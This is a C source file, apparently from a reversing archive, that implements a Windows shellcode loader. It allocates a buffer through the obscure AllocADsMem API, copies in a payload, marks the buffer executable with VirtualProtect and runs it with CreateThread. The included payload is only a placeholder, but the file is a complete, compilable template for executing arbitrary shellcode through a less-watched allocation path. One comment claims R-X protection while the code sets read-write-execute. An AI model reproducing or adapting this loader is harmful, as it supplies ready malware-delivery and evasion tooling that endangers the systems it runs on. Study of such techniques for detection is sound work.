/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in stack

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: AllocADsMem
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib,"onecore")


/* ========= function signatures ========= */
typedef LPVOID AllocADsMem_t(DWORD);
typedef AllocADsMem_t FAR * pAllocADsMem;

typedef BOOL FreeADsMem_t(LPVOID);
typedef FreeADsMem_t FAR * pFreeADsMem;

#include <stdio.h>
int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HMODULE     activeds;
    SIZE_T      isize;
    WIN32_MEMORY_REGION_INFORMATION info;

    // function pointer to API
    pAllocADsMem    AllocADsMem;
    pFreeADsMem     FreeADsMem;

    // resolve all functions
    activeds    = LoadLibrary("activeds.dll");
    AllocADsMem = (pAllocADsMem) GetProcAddress(activeds, "AllocADsMem");
    FreeADsMem  = (pFreeADsMem)  GetProcAddress(activeds, "FreeADsMem");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = AllocADsMem (payload_len);

    // find the region where the address belong to
    QueryVirtualMemoryInformation(GetCurrentProcess(), runtime, MemoryRegionInfo, &info, sizeof(info), &isize);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READWRITE, &old_protect);

    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // revert region to original protection and free the buffer
    VirtualProtect (info.AllocationBase, info.CommitSize, old_protect, &old_protect);
    FreeADsMem (runtime);

    return 0;
}